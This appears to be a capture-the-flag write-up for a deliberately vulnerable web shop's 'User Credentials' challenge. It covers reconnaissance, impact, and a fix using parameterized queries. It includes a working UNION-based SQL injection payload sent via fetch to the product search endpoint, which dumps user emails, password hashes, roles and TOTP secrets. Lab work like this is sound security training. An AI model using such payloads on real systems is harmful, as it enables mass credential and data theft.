## Methodology

1. **Reconnaissance**
   - Identified the challenge objective: retrieve all user credentials via SQL injection.
   - Used the Challenges API to confirm the challenge key and description:
     ```javascript
     fetch('/api/Challenges/', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(d => {
       const c = d.data.find(x => x.name === 'User Credentials');
       console.log(c.key, c.description);
     });
     // Output: unionSqlInjectionChallenge
     ```

2. **Attack Surface Identification**
   - Targeted the product search endpoint (`/rest/products/search?q=`) as a potential SQL injection vector.
   - Confirmed the endpoint directly embeds user-supplied input into SQL queries without sanitization.

3. **UNION-Based SQL Injection**
   - Crafted a UNION SELECT payload to extract data from the `Users` table:
     ```javascript
     fetch("/rest/products/search?q='))UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--", {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(console.log);
     ```
   - The payload closes the original query with `'))`, appends a UNION SELECT targeting the `Users` table, and comments out the rest with `--`.

4. **Validation**
   - Received a JSON response containing all user records, including emails, hashed passwords, roles, and sensitive fields.
   - Challenge marked as solved upon successful extraction.

### Tools Used
- **Browser DevTools**: For executing JavaScript and analyzing API responses.
- **Custom JavaScript Fetch**: To craft and send the malicious request.
- **SQL Injection Techniques**: UNION-based injection to extract data.

---

## Vulnerabilities

- **Vulnerability Type**: UNION-Based SQL Injection (CWE-89)
- **Affected Component**: Product search endpoint (`GET /rest/products/search`), SQLite database
- **Severity Level**: **Critical**
  - Enables full extraction of sensitive user data, including credentials, roles, and authentication tokens.

---

## Risks

- **Business Impact**:
  - **Full Database Compromise**: Attackers can read any table in the database, including users, orders, and payment data.
  - **Credential Theft at Scale**: Extraction of password hashes allows offline brute-force attacks against all user accounts.
  - **Privilege Escalation**: Exposure of roles and tokens enables attackers to impersonate admin accounts.
  - **Regulatory Consequences**: Mass extraction of PII (emails, IPs, profile data) constitutes a GDPR breach, risking fines up to 4% of annual global turnover.
  - **Reputational Damage**: Critical security failure erodes customer trust and brand reputation.

---

## Actions

### Mitigation Strategies
- **Parameterized Queries**: Use parameterized queries or prepared statements for all database interactions.
- **Least Privilege Principle**: Restrict database user permissions to prevent access to sensitive tables from untrusted contexts.
- **Input Validation**: Reject query parameters containing SQL keywords or special characters.

### Remediation Fixes
- Replace raw SQL queries with parameterized Sequelize queries:

```javascript
  // Vulnerable
  db.query(`SELECT * FROM Products WHERE name LIKE '%${req.query.q}%'`);

  // Secure
  Product.findAll({
    where: {
      name: { [Op.like]: `%${req.query.q}%` }
    }
  });
```
